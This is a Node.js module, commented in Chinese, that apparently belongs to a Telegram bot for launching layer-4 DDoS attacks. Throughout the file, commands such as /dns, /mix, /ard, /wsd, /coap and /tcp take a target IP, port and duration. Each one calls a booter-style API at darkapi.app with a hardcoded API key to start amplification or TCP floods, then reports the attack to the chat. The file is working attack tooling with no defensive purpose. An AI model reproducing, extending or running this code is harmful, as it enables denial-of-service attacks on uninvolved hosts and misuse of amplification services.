const axios = require('axios'); // 引入 axios 用于发送 HTTP 请求

// 假设这个变量用来追踪攻击的剩余时间
let attackInProgress = false;
let attackEndTime = 0;

// 处理 L4 攻击的函数
module.exports.handleL4 = (bot, chatId, message) => {
  const parts = message.split(' ');  // 按空格拆分命令

  // 检查是否有正在进行的攻击
  const currentTime = Date.now();
  if (attackInProgress) {
    const remainingTime = Math.ceil((attackEndTime - currentTime) / 1000);  // 剩余时间，单位秒
    if (remainingTime > 0) {
      bot.sendMessage(chatId, `启动攻击失败，正在攻击，剩余时间：${remainingTime}秒，请稍后再试。`);
      return;
    }
  }

  // 如果命令以 /dns 开头
  if (message.startsWith('/dns')) {
    if (parts.length === 4) {  // 需要检查命令是否包含 4 个部分
      const ip = parts[1];  // 从 parts[1] 获取 IP
      const port = parts[2];  // 从 parts[2] 获取端口
      let duration = parseInt(parts[3]);  // 从 parts[3] 获取攻击持续时间

      // 验证持续时间不超过 60 秒
      if (isNaN(duration) || duration <= 0 || duration > 60) {
        bot.sendMessage(chatId, '攻击时间必须是一个有效的数字，且最大不能超过 60 秒！');
        return;
      }

      // 启动攻击
      attackInProgress = true;
      attackEndTime = currentTime + (duration * 1000);  // 计算攻击结束时间

      const apiUrl = `https://darkapi.app/launch/4?api_key=cm45fzg97000225cyc3098v5f&label=1&host=${ip}&port=${port}&method=DNS&duration=${duration}&slots=1&cidr_mode=%2F20`;

      // 调用 API 执行攻击
      axios.get(apiUrl)
        .then(response => {
          bot.sendMessage(chatId, `L4 DNS攻击已启动！\n目标：${ip}:${port}\n攻击方法：DNS\n攻击持续时间：${duration}秒`);
        })
        .catch(error => {
          console.error(error);
          bot.sendMessage(chatId, '启动攻击失败，请稍后再试。');
        });

      // 攻击完成后清除状态
      setTimeout(() => {
        attackInProgress = false;
      }, duration * 1000);
    } else {
      bot.sendMessage(chatId, '命令格式错误！正确格式：/dns IP 端口 时间，最大 时间 为 60 秒');
    }
  }

  // 如果命令以 /mix 开头
  else if (message.startsWith('/mix')) {
    if (parts.length === 4) {
      const ip = parts[1];
      const port = parts[2];
      let duration = parseInt(parts[3]);

      if (isNaN(duration) || duration <= 0 || duration > 60) {
        bot.sendMessage(chatId, '攻击时间必须是一个有效的数字，且最大不能超过 60 秒！');
        return;
      }

      attackInProgress = true;
      attackEndTime = currentTime + (duration * 1000);

      const apiUrl = `https://darkapi.app/launch/4?api_key=cm45fzg97000225cyc3098v5f&label=1&host=${ip}&port=${port}&method=MIX&duration=${duration}&slots=1&cidr_mode=%2F20`;

      axios.get(apiUrl)
        .then(response => {
          bot.sendMessage(chatId, `L4 混合放大器攻击已启动！\n目标：${ip}:${port}\n攻击方法：MIX\n攻击持续时间：${duration}秒`);
        })
        .catch(error => {
          console.error(error);
          bot.sendMessage(chatId, '启动攻击失败，请稍后再试。');
        });

      setTimeout(() => {
        attackInProgress = false;
      }, duration * 1000);
    } else {
      bot.sendMessage(chatId, '命令格式错误！正确格式：/mix IP 端口 时间，最大 时间 为 60 秒');
    }
  }

  // 如果命令以 /ard 开头
  else if (message.startsWith('/ard')) {
    if (parts.length === 4) {
      const ip = parts[1];
      const port = parts[2];
      let duration = parseInt(parts[3]);

      if (isNaN(duration) || duration <= 0 || duration > 60) {
        bot.sendMessage(chatId, '攻击时间必须是一个有效的数字，且最大不能超过 60 秒！');
        return;
      }

      attackInProgress = true;
      attackEndTime = currentTime + (duration * 1000);

      const apiUrl = `https://darkapi.app/launch/4?api_key=cm45fzg97000225cyc3098v5f&label=1&host=${ip}&port=${port}&method=ARD&duration=${duration}&slots=1&cidr_mode=%2F20`;

      axios.get(apiUrl)
        .then(response => {
          bot.sendMessage(chatId, `L4 ARDAMP攻击已启动！\n目标：${ip}:${port}\n攻击方法：ARD\n攻击持续时间：${duration}秒`);
        })
        .catch(error => {
          console.error(error);
          bot.sendMessage(chatId, '启动攻击失败，请稍后再试。');
        });

      setTimeout(() => {
        attackInProgress = false;
      }, duration * 1000);
    } else {
      bot.sendMessage(chatId, '命令格式错误！正确格式：/ard IP 端口 时间，最大 时间 为 60 秒');
    }
  }

  // 如果命令以 /wsd 开头
  else if (message.startsWith('/wsd')) {
    if (parts.length === 4) {
      const ip = parts[1];
      const port = parts[2];
      let duration = parseInt(parts[3]);

      if (isNaN(duration) || duration <= 0 || duration > 60) {
        bot.sendMessage(chatId, '攻击时间必须是一个有效的数字，且最大不能超过 60 秒！');
        return;
      }

      attackInProgress = true;
      attackEndTime = currentTime + (duration * 1000);

      const apiUrl = `https://darkapi.app/launch/4?api_key=cm45fzg97000225cyc3098v5f&label=1&host=${ip}&port=${port}&method=WSD&duration=${duration}&slots=1&cidr_mode=%2F20`;

      axios.get(apiUrl)
        .then(response => {
          bot.sendMessage(chatId, `L4 WSDAMP攻击已启动！\n目标：${ip}:${port}\n攻击方法：WSD\n攻击持续时间：${duration}秒`);
        })
        .catch(error => {
          console.error(error);
          bot.sendMessage(chatId, '启动攻击失败，请稍后再试。');
        });

      setTimeout(() => {
        attackInProgress = false;
      }, duration * 1000);
    } else {
      bot.sendMessage(chatId, '命令格式错误！正确格式：/wsd IP 端口 时间，最大 时间 为 60 秒');
    }
  }

  // 如果命令以 /coap 开头
  else if (message.startsWith('/coap')) {
    if (parts.length === 4) {
      const ip = parts[1];
      const port = parts[2];
      let duration = parseInt(parts[3]);

      if (isNaN(duration) || duration <= 0 || duration > 60) {
        bot.sendMessage(chatId, '攻击时间必须是一个有效的数字，且最大不能超过 60 秒！');
        return;
      }

      attackInProgress = true;
      attackEndTime = currentTime + (duration * 1000);

      const apiUrl = `https://darkapi.app/launch/4?api_key=cm45fzg97000225cyc3098v5f&label=1&host=${ip}&port=${port}&method=COAP&duration=${duration}&slots=1&cidr_mode=%2F20`;

      axios.get(apiUrl)
        .then(response => {
          bot.sendMessage(chatId, `L4 COAPAMP攻击已启动！\n目标：${ip}:${port}\n攻击方法：COAP\n攻击持续时间：${duration}秒`);
        })
        .catch(error => {
          console.error(error);
          bot.sendMessage(chatId, '启动攻击失败，请稍后再试。');
        });

      setTimeout(() => {
        attackInProgress = false;
      }, duration * 1000);
    } else {
      bot.sendMessage(chatId, '命令格式错误！正确格式：/coap IP 端口 时间，最大 时间 为 60 秒');
    }
  }

  // TCP攻击命令
  else if (message.startsWith('/tcp')) {
    if (parts.length === 4) {
      const ip = parts[1];
      const port = parts[2];
      let duration = parseInt(parts[3]);

      if (isNaN(duration) || duration <= 0 || duration > 60) {
        bot.sendMessage(chatId, '攻击时间必须是一个有效的数字，且最大不能超过 60 秒！');
        return;
      }

      attackInProgress = true;
      attackEndTime = currentTime + (duration * 1000);

      const apiUrl = `https://darkapi.app/launch/4?api_key=cm45fzg97000225cyc3098v5f&label=1&host=${ip}&port=${port}&method=TCP&duration=${duration}&slots=1&cidr_mode=%2F20`;

      axios.get(apiUrl)
        .then(response => {
          bot.sendMessage(chatId, `L4 TCP攻击已启动！\n目标：${ip}:${port}\n攻击方法：TCP\n攻击持续时间：${duration}秒`);
        })
        .catch(error => {
          console.error(error);
          bot.sendMessage(chatId, '启动攻击失败，请稍后再试。');
        });

      setTimeout(() => {
        attackInProgress = false;
      }, duration * 1000);
    } else {
      bot.sendMessage(chatId, '命令格式错误！正确格式：/tcp IP 端口 时间，最大 时间 为 60 秒');
    }
  }

  // 其他攻击命令的处理...
};
